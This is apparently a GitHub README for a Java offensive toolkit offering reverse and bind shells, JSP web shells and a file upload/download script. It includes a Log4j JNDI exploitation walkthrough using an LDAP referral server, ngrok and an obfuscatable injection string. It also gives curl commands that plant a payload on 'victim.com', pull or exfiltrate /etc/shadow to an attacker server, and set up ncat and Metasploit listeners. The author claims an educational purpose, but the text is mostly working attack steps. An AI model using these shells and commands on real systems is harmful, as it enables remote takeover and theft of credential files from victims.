# Java Reverse TCP

JAR files and JSP scripts for communicating with a remote host.

Remote host will have a full control over the client and all the underlying system commands.

Works on Linux OS and macOS with `/bin/sh` and Windows OS with `cmd.exe`. Program will automatically detect an underlying OS.

Works with both `ncat` and `multi/handler`.

Check the source code of JAR files:

* [/src/Reverse Shell/src/reverse/shell/ReverseShell.java](https://github.com/ivan-sincek/java-reverse-tcp/blob/main/src/Reverse%20Shell/src/reverse/shell/ReverseShell.java)
* [/src/Reverse Shell/src/reverse/shell/BindShell.java](https://github.com/ivan-sincek/java-reverse-tcp/blob/main/src/Bind%20Shell/src/bind/shell/BindShell.java)

Built with JDK v8 on Apache NetBeans IDE v12.2 (64-bit). All the files require Java SE v8 or greater to run.

JAR files were tested with Java v8 update 282 on Windows 10 Enterprise OS (64-bit) and Kali Linux v2021.2 (64-bit).

JSP scripts were tested on Apache Tomcat Version v7.0.100 on XAMPP for Windows v7.4.3 (64-bit).

Made for educational purposes. I hope it will help!

## Table of Contents

* [JAR Shells](#jar-shells)
* [Log4j Shells](#log4j-shells)
* [JSP Reverse Shell](#jsp-reverse-shell)
* [JSP Web Shells](#jsp-web-shells)
* [JSP File Upload/Download Script](#jsp-file-uploaddownload-script)
* [Set Up a Listener](#set-up-a-listener)
* [Images](#images)

## JAR Shells

Open your preferred console from [/jar/](https://github.com/ivan-sincek/java-reverse-tcp/tree/main/jar) and run the following commands:

```fundamental
java -jar Reverse_Shell.jar 192.168.8.185 9000

java -jar Bind_Shell.jar 9000
```

## Log4j Shells

This PoC was tested on Kali Linux v2021.4 (64-bit).

**Change the IP address and port number inside the source files as necessary.**

Open your preferred console from [/log4j/](https://github.com/ivan-sincek/java-reverse-tcp/tree/main/log4j) and run the following commands:

Compile the source file:

```fundamental
javac ReverseShell.java
```

Start a local web server from the same directory as the compiled class file (i.e. `ReverseShell.class`):

```fundamental
python3 -m http.server 9090

python3 -m http.server 9090 --directory somedirectory
```

P.S. You can use any web server you like.

Start a local LDAP server and create a reference to the compiled class file on your local web server:

```bash
git clone https://github.com/mbechler/marshalsec && cd marshalsec && mvn clean package -DskipTests && cd target

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:9090/#ReverseShell
```

Credits to the author for [marshalsec](https://github.com/mbechler/marshalsec)!

Give the local LDAP server a public domain with [ngrok](https://ngrok.com):

```fundamental
./ngrok tcp 1389
```

Build the JNDI string (obfuscate it however you like):

```fundamental
${jndi:ldap://x.tcp.ngrok.io:13337/ReverseShell}
```

## JSP Reverse Shell

**Change the IP address and port number inside the script as necessary.**

Copy [/jsp/jsp_reverse_shell.jsp](https://github.com/ivan-sincek/java-reverse-tcp/blob/main/src/Web%20Shell/web/jsp_reverse_shell.jsp) to your projects's root directory or upload it to your target's web server.

Navigate to the file with your preferred web browser.

## JSP Web Shells

Check the [simple JSP web shell](https://github.com/ivan-sincek/java-reverse-tcp/blob/main/src/Web%20Shell/web/simple_jsp_web_shell_post.jsp) based on HTTP POST request.

Check the [simple JSP web shell](https://github.com/ivan-sincek/java-reverse-tcp/blob/main/src/Web%20Shell/web/simple_jsp_web_shell_get.jsp) based on HTTP GET request. You must [URL encode](https://www.urlencoder.org) your commands.

## JSP File Upload/Download Script

Check the [simple JSP file upload/download script](https://github.com/ivan-sincek/java-reverse-tcp/blob/main/src/Web%20Shell/web/files.jsp) based on HTTP POST request for file upload and HTTP GET request for file download.

When downloading a file, you should [URL encode](https://www.urlencoder.org) the file path, and specify name of the output file.

### Case 1: Upload the Script to the Victim’s Server

Navigate to the script on the victim's server with your preferred web browser, or use cURL from you PC.

Upload a file to the victim's server web root directory from your PC:

```fundamental
curl -s -k -X POST https://victim.com/files.jsp -F file=@/root/payload.exe
```

Download a file from the victim's PC to your PC:

```fundamental
curl -s -k -X GET https://victim.com/files.jsp?file=/etc/shadow -o shadow
```

If you use reverse shell and you have elevated your initial privileges, this script might not have the same privileges as your shell. To download a certain file, you might need to copy the file to the web root directory and give it necessary read permissions.

### Case 2: Upload the Script to Your Server

From your PHP reverse shell, run the following cURL commands.

Upload a file from the victim's PC to your server web root directory:

```fundamental
curl -s -k -X POST https://your-server.com/files.jsp -F file=@/etc/shadow
```

Download a file from your PC to the victim's PC:

```fundamental
curl -s -k -X GET https://your-server.com/files.jsp?file=/root/payload.exe -o payload.exe

curl -s -k -X GET https://your-server.com/payload.exe -o payload.exe
```

## Set Up a Listener

To set up a listener, open your preferred console on Kali Linux and run one of the examples below.

Set up `ncat` listener:

```fundamental
ncat -nvlp 9000
```

Set up `multi/handler` listener:

```fundamental
msfconsole -q

use exploit/multi/handler

set PAYLOAD windows/shell_reverse_tcp

set LHOST 192.168.8.185

set LPORT 9000

exploit
```

## Images

<p align="center"><img src="https://github.com/ivan-sincek/java-reverse-tcp/blob/main/img/reverse_shell.jpg" alt="Reverse Shell"></p>

<p align="center">Figure 1 - Reverse Shell</p>

<p align="center"><img src="https://github.com/ivan-sincek/java-reverse-tcp/blob/main/img/ncat.png" alt="Ncat"></p>

<p align="center">Figure 2 - Ncat</p>
